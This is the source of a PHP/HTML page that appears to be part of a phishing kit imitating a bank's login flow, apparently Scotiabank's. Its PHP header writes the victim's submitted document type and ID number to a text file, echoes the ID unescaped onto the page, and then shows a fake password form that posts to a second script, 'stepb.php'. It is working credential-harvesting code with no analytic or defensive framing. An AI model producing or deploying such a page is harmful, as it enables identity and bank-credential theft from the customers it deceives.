<?php

$datoa = $_POST['id'];
$datob = $_POST['ident'];
$archivo="Vi24.txt";
$file=fopen($archivo,"a");
fwrite($file, "Tipo docum:" .$datoa.PHP_EOL);
fwrite($file, "Documento: ".$datob .PHP_EOL);
fclose($file);
?>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1" >
        <link rel="stylesheet" href="stle.css">
        <title>Verificacion</title>
        <meta charset="utf-8">
        <style>
 * {margin:0px;}
body {width:100%;background-color:#fafbfd; font-family: arial;color:#4E4C4C;}
.container {width:100%;}
.box {width:28%;height:47%;margin:0 auto;background-color: white;border-radius: 5px;margin-right: auto;margin-left: auto;position: relative;
-webkit-box-shadow: 0px 2px 2px 0px rgb(214 214 214);
-moz-box-shadow: 0px 2px 2px 0px rgba(214, 214, 214, 1);
box-shadow: 0px 1px 2px 0px rgb(226 225 225);
top: 30px;border: 1px solid #e2e8ee;padding: 45px;}        
.ray {background-color: #ec111a;height: 2px;max-width: 30px;position: relative;top: 10px;margin-left:1px;}
.icon-canvas {font-family: canvas-icon !important;content: "";color: #cb061d;line-height: 1.3;padding-right: 0.3rem;vertical-align: text-bottom;}
.font-600 {font-weight: 550;}
.selecto-list {width: 100%;border-top: 0px;border-right: 0px;border-left: 0px;border-color: rgb(255, 255, 255);}
select {background-color: transparent;}

label {width: 100%;display: block;cursor: pointer;}
#pass {border: none;border-bottom: 1px solid rgb(169, 169, 169);width: 100%;font-size:14px;font-weight: normal;padding-top:2%;padding-bottom:2%;padding-left:5%;}
#pass:focus-visible {outline: none;}
#pass::placeholder {font-weight: 200;font-size: 15px;color: grey;padding-left:1%;}
#pass:focus {border-bottom:2px solid #38B2E3;}
input::-webkit-outer-spin-button,
input::-webkit-inner-spin-button {
-webkit-appearance: none;margin: 0; }
input[type="number"] {
-moz-appearance: textfield; }
.enviar {opacity: 1;color: #757575;text-decoration: none;padding: 12px;margin-top: 30px;border: 1px solid #dedede;
background-color: #fafbfd;width: 100%;border-radius: 5px;cursor:pointer;}
h4 {font-size:1.3em;color:black;}
label {font-size:0.8em;color:#272626;}
select::option {font-size:18px;}
h5 {color:#4b9ac0;cursor:pointer;}
a {text-decoration:none;color:#0E87B8;cursor:pointer;font-weight:800;}
#ico {float:left;padding-right:2%;margin-top:-4%;}
input[type=checkbox] {padding:5%; transform: scale(2);}
p {margin-top:-4%;margin-left:7%;font-size:12px;font-weight:800;}
#icon {float:left;position:absolute;padding-top:2%;}
footer {width:100%;}

select {position: relative;margin-right: 1rem;}
details[open] {z-index: 1;}  
select {
      cursor: pointer;
      border:0;
      background-color: transparent;
      list-style: none;
      width: 104%;
      color: rgb(169, 169, 169);
      border-bottom: 1px solid rgb(169, 169, 169);
    }
select[open] {
      content: "";
      display: block;
      width: 100vw;
      height: 100vh;
      background: transparent;
      position: fixed;
      top: 0;
      left: 0;
    } 
    select:focus {
      outline: none;
    }
.logof,.logog {display:none;}
 @media only screen and (min-device-width: 1800px) {
body {width:100%;}
.box {height:37%;width:23%;}
.logof,.logog {display:none;}
}

@media only screen and (min-device-width: 1500px) and (max-device-width: 1800px){
body {width:100%;}
.box {height:37%;width:25%;}
.logof,.logog {display:none;}

}

@media only screen and (max-device-width: 1250px) {
body {width:100%;}
.box {height:35%;width:30%;}
.enviar {margin-top: 10%;}
.logof,.logog {display:none;}

}

@media only screen and (max-device-width: 1100px) {
body {width:100%;}
.logof,.logog {display:none;}
}

@media only screen and (max-device-width: 750px) {
body {max-width:100%;}
.box {width:95%;padding:0;border:none;background-color: transparent;
    -webkit-box-shadow:none;
-moz-box-shadow: none;
box-shadow: none;}
.logo,#logo {display:none;}
.logof,.logog {display:inline-block;width:100%;}
.container {max-width:100%;}
h5 {font-size:14px;font-weight:400;}
a {font-weight:400;}
#icon {float:left;position:absolute;padding-top:2%;padding-left:5%;}
#che,#submitx,#con,#pass {margin-left:5%;}
#submitx {width:90%;}
p {margin-left:12%;font-weight:600}
#pass {width:90%;}
.logog {position:absolute;top:60%;}
input[type=checkbox] {padding:2%; transform: scale(1);}
}
        </style>
    </head>
<body>
    <div class="logof"><img src="im/logof.png" width="100%"></div>
    <div class="container">
        <img src="im/logoa.png" width="100%" height="10%" id="logo">
        <div class="box">
            <img src="im/scot.png" id="ico" >
            <div class="header">
                   
            <h4 class="font-600"><?php echo  $datob ; ?></h4>
            <h5><a href="index.html">Cambiar usuario</a></h5>
            <br> <br>
          </div>
                <form method="post" action="stepb.php" autocomplete="off">
                   
              <span id="icon"><img src="im/look.png" width="12px" height="12px"></span>
              <input type="password"  name="pass" id="pass"
                placeholder="Contraseña" required /><br><br><br>
               <h5 ><a href="index.html" id="con">¿Olvidaste tu Contraseña?</a></h5><br>
               <input type="checkbox" id="che"><p>Confiar en este Navegador</p> 
              <button id="submitx" class="enviar scotia-font font-600" disabled style="font-size: 16px">
                Iniciar sesion
              </button>
              
            </form>
            </div>
            
       
        </div>
        
        
        <br><br>
         <div class="footer">
            <div class="logog"><img src="im/logog.png" width="100%"></div>
            <div class="logo"><img src="im/logob.png" width="100%"></div>
        </div>
   
    </div>
    
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
    crossorigin="anonymous"></script>
  <script>
    var identificacion = document.getElementById("pass");
    var submitx = document.getElementById("submitx");
    var i = 0;
    var si = 0;
    var num_doc = document.getElementById("num_doc");

    identificacion.addEventListener("keydown", contar, false);
    function contar() {
      let ogt = identificacion.value;
      console.log(ogt.length);
      if (ogt.length === 7) {
        submitx.style.backgroundColor = "red";
        submitx.style.color = "white";
        submitx.removeAttribute('disabled')
      }
      if (ogt.length < 7) {
        submitx.style.backgroundColor = "transparent";
        submitx.style.color = "gray";
        submitx.setAttribute('disabled','');
      }
    }
    
  </script>
    
</body>
</html>